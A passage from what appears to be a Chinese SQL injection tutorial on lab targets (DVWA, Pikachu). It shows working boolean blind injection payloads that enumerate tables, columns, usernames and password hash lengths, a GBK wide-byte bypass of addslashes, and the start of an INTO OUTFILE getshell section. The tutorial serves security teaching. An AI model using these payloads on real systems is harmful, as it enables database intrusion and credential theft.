</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() limit 0,1),1))&gt;8;# exists
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=mi>9</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span></code></pre></div><p>2）依次取出dvwa数据库第1个表的第1/2/&mldr;/9个字符分别猜解：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and ascii(substr((select table_name from information_schema.tables where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() limit 0,1),1,1))&gt;88;# exists
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>105</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and ascii(substr((select table_name from information_schema.tables where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() limit 0,1),1,1))&gt;96;# exists
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>101</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and ascii(substr((select table_name from information_schema.tables where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() limit 0,1),1,1))&gt;103;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=mi>102</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and ascii(substr((select table_name from information_schema.tables where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() limit 0,1),1,1))=103;# exists
</span></span></span></code></pre></div><p>dvwa数据库第1个表的第1个字符的ASCII码=103，对应的字符为g
依次猜解出其他位置的字符分别为：u、e、s、t、b、o、o、k
从而dvwa数据库第1个表的名称为：guestbook</p><p>重复以上操作，可知第二个表为users</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and ascii(substr((select table_name from information_schema.tables where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() limit 1,1),2,1))&gt;88;#
</span></span></span></code></pre></div><h3 id=44-猜解表中的字段名>4.4 猜解表中的字段名</h3><h4 id=441-猜解users表中的字段个数>4.4.1 猜解users表中的字段个数</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and (select count(column_name) from information_schema.columns where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() and table_name=&#39;</span><span class=n>users</span><span class=s1>&#39;)&gt;10;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;users&#39;</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>5</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and (select count(column_name) from information_schema.columns where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() and table_name=&#39;</span><span class=n>users</span><span class=s1>&#39;)&gt;8;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;users&#39;</span><span class=p>)</span><span class=o>=</span><span class=mi>8</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span></code></pre></div><p>dvwa库的users表中有8个字段</p><h4 id=442-猜解users表中的各个字段的名称>4.4.2 猜解users表中的各个字段的名称</h4><p>按照常规流程，从users表的第1个字段开始，对其猜解每一个组成字符，获取到完整的第1个字段名称&mldr;然后是第2/3/&mldr;/8个字段名称。
当字段数目较多、名称较长的时候，若依然按照以上方式手工猜解，则会耗费比较多的时间。当时间有限的情况下，实际上有的字段可能并不太需要获取，字段的位置也暂且不作太多关注，首先获取几个包含关键信息的字段，如：用户名、密码&mldr;</p><p>【猜想】数据库中可能保存的字段名称
用户名：username/user_name/uname/u_name/user/name/&mldr;
密码：password/pass_word/pwd/pass/&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and (select count(*) from information_schema.columns where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() and table_name=&#39;</span><span class=n>users</span><span class=s1>&#39; and column_name=&#39;</span><span class=n>username</span><span class=s1>&#39;)=1;#
</span></span></span><span class=line><span class=cl><span class=s1>MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;users&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>column_name</span><span class=o>=</span><span class=s1>&#39;user_name&#39;</span><span class=p>)</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and (select count(*) from information_schema.columns where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() and table_name=&#39;</span><span class=n>users</span><span class=s1>&#39; and column_name=&#39;</span><span class=n>uname</span><span class=s1>&#39;)=1;#
</span></span></span><span class=line><span class=cl><span class=s1>MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;users&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>column_name</span><span class=o>=</span><span class=s1>&#39;u_name&#39;</span><span class=p>)</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and (select count(*) from information_schema.columns where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() and table_name=&#39;</span><span class=n>users</span><span class=s1>&#39; and column_name=&#39;</span><span class=k>user</span><span class=s1>&#39;)=1;#
</span></span></span><span class=line><span class=cl><span class=s1>exists
</span></span></span></code></pre></div><p>users表中存在字段user</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and (select count(*) from information_schema.columns where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() and table_name=&#39;</span><span class=n>users</span><span class=s1>&#39; and column_name=&#39;</span><span class=n>password</span><span class=s1>&#39;)=1;#
</span></span></span><span class=line><span class=cl><span class=s1>exists
</span></span></span></code></pre></div><p>users表中存在字段password</p><p>至此，库名（dvwa），表名（guestbook、users），字段名（user、password）都猜出来了。</p><h3 id=45-获取表中的字段值>4.5 获取表中的字段值</h3><p>4.5.1 获取表中的字段值</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and length(substr((select user from users limit 0,1),1))&gt;10;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>5</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and length(substr((select user from users limit 0,1),1))&gt;3;# exists
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=mi>4</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and length(substr((select user from users limit 0,1),1))=5;# exists
</span></span></span></code></pre></div><p>user字段中第1个字段值的字符长度=5，再使用ascii码的方式逐个爆破字符，重复操作即可。</p><p>4.5.2 获得密码字段值</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and length(substr((select password from users limit 0,1),1))&gt;10;# exists
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>20</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and length(substr((select password from users limit 0,1),1))&gt;40;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>30</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and length(substr((select password from users limit 0,1),1))&gt;35;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>33</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and length(substr((select password from users limit 0,1),1))=32;# exists
</span></span></span></code></pre></div><p>password字段中第1个字段值的字符长度=32 （这么长的字符串，通常是md5加密了，重复之前的操作即可获取密码，此处不做演示）</p><h3 id=45-后端注入>4.5 后端注入</h3><p><strong>由于前后端显示内容不同，此处只演示成功查询案例，验证sql的可行性</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;1&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;kk&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Empty</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=k>database</span><span class=p>())</span><span class=o>=</span><span class=mi>4</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=mi>100</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><h2 id=5-宽字节注入>5 宽字节注入</h2><blockquote><p>使用Pikachu 宽字节注入模块演示</p></blockquote><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326181207243.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326181207243.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326181207243.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326181207243.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326181207243.png title=image-20230326181207243></p><p>1.单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)。
2.多字节字符集：在多字节字符集中，一部分字符用多个字节来表示，另一部分（可能没有）用单个字节来表示。
3.宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字。</p><p>**宽字节注入背景 **</p><p>为了防止网站被SQL注入，一些网站开发人员会做一些防护措施，其中最常见的就是对一些特殊字符进行转义。
通过前面的学习可以了解到，SQL注入非常关键的一步就是让引号闭合和跳出引号，无法跳出引号，那么输入的内容就永远在引号里，那么输入的东西永远就是字符串，很显然这不符合SQL注入的要求。
网站开发者也想到了这一步，于是做个防护措施：转义，对输入的敏感内容、特殊字符进行转义。</p><p>**addslashes()函数 **</p><p>1、addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。
2、预定义字符：单引号（&rsquo;），双引号（"），反斜杠（\），NULL
通过前面的SQL注入实验可以发现，字符型的注入点我们都是用单引号来判断的，但是当遇到addslashes()时，单引号会被转义，导致我们用来判断注入点的单引号失效。 所以我们的目的就是使转义符 \ 失效、使单引号逃逸。</p><p><strong>宽字节常用替换等式：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>URL编码：
</span></span><span class=line><span class=cl>    <span class=c>%df = \
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>GBK编码：
</span></span><span class=line><span class=cl>	<span class=c>%df%5c = 運
</span></span></span></code></pre></div><p>**原理：**前端输入的反斜杠（\）经过URL编码后是%5c。在输入%df后，使得添加反斜杠后形成%df%5c，如果程序数据库使用了GBK编码，%df%5c就会被识别成繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误。整个过程的关键点在于单引号前面的%df，造成宽字节注入使得单引号逃逸从而使得注入语句正常执行。</p><p>[GBK 编码范围, GBK 编码表 (qqxiuzi.cn)](<a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK" target=_blank rel="noopener noreffer">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK</a>编码，是对GB2312编码的扩展，因此完全兼容GB2312-80标准。,GBK编码依然采用双字节编码方案，其编码范围：8140－FEFE，剔除xx7F码位，共23940个码位。 共收录汉字和图形符号21886个，其中汉字（包括部首和构件）21003个，图形符号883个。)</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326182143735.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326182143735.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326182143735.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326182143735.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326182143735.png title=image-20230326182143735></p><p>开启burp抓包，使用注入语句<code>kube%df' or 1=1 #</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326185709657.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326185709657.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326185709657.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326185709657.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326185709657.png title=image-20230326185709657></p><p>burp抓包结果（%df中的%经URL编码，变成了%25)</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326185838539.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326185838539.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326185838539.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326185838539.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326185838539.png title=image-20230326185838539></p><p>使用repeater模块，删除25（使得%df原封不动地传递到后端解码），注入成功</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326191231679.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326191231679.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326191231679.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326191231679.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326191231679.png title=image-20230326191231679></p><p>后面的注入过程同2.1类似，不再演示</p><h2 id=6-sql注入获取dvwa站点的getshell>6 SQL注入获取DVWA站点的Getshell</h2><blockquote><p>使用DVWA SQL Injection模块，安全等级：Low</p></blockquote><p>Mysql支持向外写文件（这里的“外”是指安装了MySQL的宿主机），
在mysql数据库中存在mysql select into outfile命令，该命令的作用是将被选择的一行写入一个文件中，文件被创建到服务器上。</p><p>其中，into outfile的使用前提是：
（1）要知道网站的绝对路径，可以通过开源程序、报错信息、phpinfo界面、404界面等一些方式知道
（2）要有mysql file权限（即能否对系统的文件读取和写操作），默认情况下只有root权限有
（3）对目录要有写权限，一般image之类的存放图片的目录有写权限
还要注意：写的文件名一定是在网站中不存在的，不然会失败。
